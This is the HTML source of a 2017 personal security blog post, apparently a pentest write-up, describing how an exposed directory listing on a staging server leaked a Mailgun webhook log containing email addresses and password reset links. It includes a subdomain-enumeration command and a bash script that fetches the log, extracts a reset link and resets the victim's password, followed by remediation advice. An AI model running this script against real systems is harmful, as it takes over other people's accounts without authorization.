@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en-US">
+
+<head>
+<meta charset="utf-8" />
+<meta name="author" content="Nishaanth Guna" />
+<meta name="description" content="Personal blog." />
+<meta name="keywords" content="blog, tech, security, pentest, bounty, vulnerability" />
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+<meta name="generator" content="Hugo 0.35" />
+
+<link rel="canonical" href="https://ifc0nf1g.xyz/blog/post/directory-listing-to-takeover/">
+<base href="https://ifc0nf1g.xyz/blog/" />
+<meta property="og:title" content="Directory Listing to Account Takeover" />
+<meta property="og:description" content="Directory listing is one of the most common misconfigurations which can be exploited trivially. However, the impact depends on the criticality of the files present inside the directory.
+Recently, during one of my pentests, I came across an interesting open directory which I was able to leverage. On enumerating, I discovered a subdomain which was the staging server and was accessible over the internet.
+[nishaanthguna:~/essentials]$ curl --silent https://crt.sh/\?q\=%.domain.com | sed &#39;s/&lt;\/\?" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://ifc0nf1g.xyz/blog/post/directory-listing-to-takeover/" />
+
+
+
+<meta property="article:published_time" content="2017-12-30T01:19:34-08:00"/>
+
+<meta property="article:modified_time" content="2017-12-30T01:19:34-08:00"/>
+
+
+
+
+
+
+
+
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Directory Listing to Account Takeover"/>
+<meta name="twitter:description" content="Directory listing is one of the most common misconfigurations which can be exploited trivially. However, the impact depends on the criticality of the files present inside the directory.
+Recently, during one of my pentests, I came across an interesting open directory which I was able to leverage. On enumerating, I discovered a subdomain which was the staging server and was accessible over the internet.
+[nishaanthguna:~/essentials]$ curl --silent https://crt.sh/\?q\=%.domain.com | sed &#39;s/&lt;\/\?"/>
+
+
+
+<meta itemprop="name" content="Directory Listing to Account Takeover">
+<meta itemprop="description" content="Directory listing is one of the most common misconfigurations which can be exploited trivially. However, the impact depends on the criticality of the files present inside the directory.
+Recently, during one of my pentests, I came across an interesting open directory which I was able to leverage. On enumerating, I discovered a subdomain which was the staging server and was accessible over the internet.
+[nishaanthguna:~/essentials]$ curl --silent https://crt.sh/\?q\=%.domain.com | sed &#39;s/&lt;\/\?">
+
+
+<meta itemprop="datePublished" content="2017-12-30T01:19:34-08:00" />
+<meta itemprop="dateModified" content="2017-12-30T01:19:34-08:00" />
+<meta itemprop="wordCount" content="375">
+
+
+
+<meta itemprop="keywords" content="" />
+
+
+<link rel="stylesheet" href="css/layout.css" />
+<style type="text/css">
+body {
+  background-color: #101010;
+  color: #dbdbdb;
+}
+
+a { color: #dbdbdb; }
+
+pre {
+  background: #1D1F21;
+  border: 1px solid #dbdbdb;
+  border-radius: 5px;
+}
+
+code {
+  background: #1D1F21;
+}
+
+blockquote {
+  background: #1D1F21;
+  border-left: 3px solid #dbdbdb;
+}
+
+table {
+  margin: 1em auto;
+  border-collapse: collapse;
+}
+
+table, th, td {
+  border: 1px solid #dbdbdb;
+}
+
+th {
+  background: #dbdbdb;
+  color: #101010;
+}
+
+.siteTitle a { color: #99cc66; }
+
+.post .content h1{ color: #99cc66; }
+.post .content h2{ color: #99cc66; }
+.post .content h3{ color: #99cc66; }
+.post .content h4{ color: #99cc66; }
+.post .content h5{ color: #99cc66; }
+.post .content h6{ color: #99cc66; }
+.post .content a:hover { color: #99cc66; }
+.social-link:hover { color: #99cc66; }
+.nav-item-title:hover { color: #99cc66; }
+.tag a:hover { color: #99cc66; }
+.copyright { color: #404040 }
+.poweredby { color: #404040 }
+.poweredby a { color: #404040; }
+.post-preview .title a{ color: #99cc66; }
+.content-item a:hover{
+  text-decoration: underline;
+  color: #99cc66;
+}
+.post-list .title { color: #99cc66; }
+.rmore { color: #99cc66; }
+.terms .term a:hover {
+  text-decoration: underline;
+  color: #99cc66;
+}
+
+</style>
+
+
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-52576918-2', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='//www.google-analytics.com/analytics.js'></script>
+
+
+<title>
+
+
+     Directory Listing to Account Takeover 
+
+</title>
+
+</head>
+
+
+<body>
+<div class="main">
+<header>
+
+<div class="header-bar">
+
+  <nav>
+    <div class="siteTitle">
+      <a href="https://ifc0nf1g.xyz/blog/">ls -l /var/www/blog</a>
+    </div> 
+
+    
+    
+    <a class="nav-item" href="https://ifc0nf1g.xyz/blog/post/"><div class="nav-item-title">Posts</div></a>
+    
+    <a class="nav-item" href="https://ifc0nf1g.xyz/blog/about/"><div class="nav-item-title">About</div></a>
+    
+
+  </nav>
+</div>
+
+
+
+</header>
+
+
+<article class="post">
+    <h1 class="title"> Directory Listing to Account Takeover </h1>
+    <div class="content"> <p>Directory listing is one of the most common misconfigurations which can be exploited trivially. However, the impact depends on the <a href="https://www.itnews.com.au/news/australias-biggest-data-breach-sees-13m-records-leaked-440305">criticality of</a> <a href="https://www.troyhunt.com/the-capgemini-leak-of-michael-page-data-via-publicly-facing-database-backup/">the files</a> present inside the directory.</p>
+
+<p>Recently, during one of my pentests, I came across an interesting open directory which I was able to leverage. On enumerating, I discovered a subdomain which was the staging server and was accessible over the internet.</p>
+
+<pre><code class="language-bash">[nishaanthguna:~/essentials]$ curl --silent https://crt.sh/\?q\=%.domain.com | sed 's/&lt;\/\?[^&gt;]\+&gt;//g' | grep -i domain.com | tail -n +9 | cut -d &quot;&gt;&quot; -f2 | cut -d &quot;&lt;&quot; -f1
+www.domain.com
+blog.domain.com
+stag.domain.com
+</code></pre>
+
+<p>On running a port scan, it was found that the port 8080 was open and had a directory listing. There wasn&rsquo;t anything sensitive until I found this.</p>
+
+<p><img src="https://ifc0nf1g.xyz/blog/images/mailgun.png" alt="mailgun" /></p>
+
+<p>From Mailgun&rsquo;s API <a href="https://documentation.mailgun.com/en/latest/user_manual.html">documentation</a>, it looks like the admininstator can track the  <a href="https://documentation.mailgun.com/en/latest/user_manual.html#tracking-bounces">bounces</a>, <a href="https://documentation.mailgun.com/en/latest/user_manual.html#tracking-opens">clicks</a>, <a href="https://documentation.mailgun.com/en/latest/user_manual.html#tracking-spam-complaints">spam compliants</a>, if the mail got <a href="https://documentation.mailgun.com/en/latest/user_manual.html#tracking-deliveries">delivered</a> or if the user
+<a href="https://documentation.mailgun.com/en/latest/user_manual.html#tracking-unsubscribes">unsubscribed</a> along with the URLs. So, what is the problem here?</p>
+
+<p>Not only the logs leaked personal and developer e-mail addresses, it also did have the reset password links. Something like this,</p>
+
+<p><img src="https://ifc0nf1g.xyz/blog/images/reset-link.png" alt="reset" /></p>
+
+<p>An attack scenario would be something similar to,</p>
+
+<ol>
+<li>An attacker uses the e-mail address obtained from the logs and resets the password using &lsquo;Forgot Password&rsquo; functionality.</li>
+<li>The victim clicks on the link sent to their e-mail address.</li>
+<li>The Attacker gets hold of the password reset token because of the directory listing and resets the password.</li>
+</ol>
+
+<p>I wrote a quick script to curl the mailgun-webhook.log file, search for reset links and automatically reset the password.</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+curl https://domain.com/mailgun-webhook.log | tee direct.txt
+if grep -Fxq &quot;reset&quot; direct.txt
+then
+ echo &quot;[+]Found a Password Reset link&quot;
+ link=$(cat direct.txt | grep -i reset | cut -d &quot;,&quot; -f6  |
+ cut -d &quot;\\&quot; -f1 | head -n 1)
+ curl '$link'-H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6)'
+ --data 'password=testpassword%21%21&amp;confirmation=testpassword%21%21' --compressed
+ echo &quot;[+]Password changed to testpassword!!&quot;
+else
+ echo &quot;[-]Reset link not found&quot;
+fi
+</code></pre>
+
+<p>It is always recommended to <a href="https://stackoverflow.com/questions/2530372/how-do-i-disable-directory-browsing">disable</a> directory listing and never store sensitive information like credentials, password reset links, API keys in cleartext.</p>
+
+<p>Update - Some people are confusing this vulnerability with the recent <a href="https://gizmodo.com/reddit-email-vulnerability-leads-to-thousands-of-dollar-1821808073">Reddit Email</a> <a href="http://blog.mailgun.com/mailgun-security-incident-and-important-customer-information/">Vulnerability</a> which was used to steal Bitcoin Cash. Both of the vulnerabilities are completely unrelated except for the fact that accounts were compromised in a similar fashion.</p>
+ </div>
+    <footer class="post-footer">
+
+  <div class="post-footer-data">
+    
+<div class="tags">
+    
+</div>
+
+    <div class="date"> Dec 30, 2017 </div>
+  </div>
+
+</footer>
+
+
+  <div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "ifc0nf1gxyz" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+</article>
+
+  <footer>
+
+  <div class="social-links-footer">
+
+  
+
+  
+  <a href="https://github.com/gameFace22" target="_blank"><div class="social-link">GitHub</div></a>
+  
+
+  
+
+  
+  <a href="https://twitter.com/67616d654661636" target="_blank"><div class="social-link">Twitter</div></a>
+  
+
+  
+  <a href="https://www.linkedin.com/in/nishaanthguna" target="_blank"><div class="social-link">LinkedIn</div></a>
+  
+
+  <div class="social-link">
+  <a href="https://ifc0nf1g.xyz/blog/index.xml" target="_blank">RSS</a>
+  </div>
+
+</div>
+
+
+  <div class="copyright"> Copyright (c) 2017, all rights reserved. </div>
+
+  <div class="poweredby">
+    Powered by <a href="https://gohugo.io/">Hugo</a>.
+  </div>
+
+  </footer>
+
+</div> 
+
+</body>
+</html>
+
